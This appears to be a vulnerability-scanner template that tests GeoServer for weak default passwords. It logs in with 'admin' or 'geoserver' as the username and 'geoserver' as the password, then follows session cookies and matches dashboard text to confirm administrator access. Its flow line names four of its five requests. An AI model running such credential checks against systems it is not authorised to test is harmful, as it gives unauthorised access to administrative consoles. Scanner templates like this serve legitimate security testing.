id: poc-yaml-geoserver-weak-password
info:
  name: GeoServer Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: geoserver,weak-password

variables:
  user:
    - admin
    - geoserver

flow: http(1) && http(2) && http(3) && http(4)

http:
  - id: check-geoserver
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers:
      - type: word
        words:
          - "geoserver"

  - id: login-request
    method: POST
    path:
      - "{{BaseURL}}/geoserver/j_spring_security_check"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "username={{user}}&password=geoserver"
    extractors:
      - type: regex
        name: cookie1
        internal: true
        part: header
        regex:
          - "JSESSIONID=(.*?);"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        words:
          - "remember-me="
        negative: true
        part: header

  - id: validate-login
    method: GET
    path:
      - "{{BaseURL}}/geoserver/web"
    headers:
      Cookie: "JSESSIONID={{cookie1}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        words:
          - "/geoserver/web/"
        part: header

  - id: confirm-login
    method: GET
    path:
      - "{{BaseURL}}/geoserver/web/"
    headers:
      Cookie: "JSESSIONID={{cookie1}}"
    extractors:
      - type: regex
        name: cookie2
        internal: true
        part: header
        regex:
          - "JSESSIONID=(.*?);"
      - type: regex
        name: path
        internal: true
        part: header
        regex:
          - "\\?([0-9])"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        words:
          - ""
        part: body

  - id: final-check
    method: GET
    path:
      - "{{BaseURL}}/geoserver/web/?{{path}}"
    headers:
      Cookie: "JSESSIONID={{cookie2}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Logged in as"
          - "Server Status"
          - "Strong cryptography available"
        part: body
